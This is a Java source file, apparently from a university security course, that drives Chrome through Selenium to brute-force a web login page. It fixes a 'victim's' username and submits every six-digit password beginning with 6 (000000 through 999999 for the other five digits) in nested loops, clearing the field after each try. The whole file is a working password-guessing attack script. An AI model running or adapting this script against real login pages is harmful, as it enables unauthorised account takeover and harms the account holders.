import java.util.Arrays;

import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;


public class six {
	public static void main(String[] args) {
			 
				//Change inside second quotation marks to where you save chromedriver.exe
				System.setProperty("webdriver.chrome.driver", "C:/Users/Thomas/Desktop/chromedriver.exe");
				
				// Create a new instance of the Chrome driver
				WebDriver driver = new ChromeDriver();
				driver.get("http://cis497.azurewebsites.net/Account/Login");
				

		        String user="6-7@ufv.ca"; //We know the victim's username
		        
		        WebElement element_enter = driver.findElement(By.xpath("//*[@id='email']"));
		        element_enter.findElement(By.xpath("//*[@id='email']")).sendKeys(user);

		 int attempt = 0; 

		 for(int a=6; a<7; a++){
		   int[] temp = {0, 0, 0, 0, 0, 0}; 
		   for(int b=0; b<10; b++){        
		     for(int c=0; c<10; c++){
			   for(int d=0; d<10; d++){
			     for(int e=0; e<10; e++){        
				   for(int f=0; f<10; f++){
					    temp[0] = a;
					    temp[1] = b; 
					    temp[2] = c;
					    temp[3] = d;
					    temp[4] = e; 
					    temp[5] = f;
					        	
					    //                    abcdef
					    //Thread.sleep(1000); 000000
					        	
					    String pass=Arrays.toString(temp);//change from int array to string
					    pass=pass.replaceAll("[,\\s\\[\\]]", ""); //take out special characters
					        	
					    System.out.println("Attempt #" + attempt + "...Trying Password: ");
					    System.out.println(pass);
					    attempt++;

					    WebElement element_enter2 = driver.findElement(By.xpath("//*[@id='password']"));
					    element_enter2.findElement(By.xpath("//*[@id='password']")).sendKeys(pass);
					            
					    driver.findElement(By.xpath("//*[@id='password']")).sendKeys(Keys.RETURN);
					            
					    WebElement delete_password=driver.findElement(By.xpath("//*[@id='password']"));  
					    delete_password.clear();
					           		        	
					   // Thread.sleep(300);
					}
				  }
		        }
		      }
		     continue; //Will break out of
		    }
		   }
		  

		        System.out.println("Class Complete");

				//Wait for 5 Sec
				//Thread.sleep(5);
				
		        // Close the driver
		        //driver.quit();
		    
		
	}

}
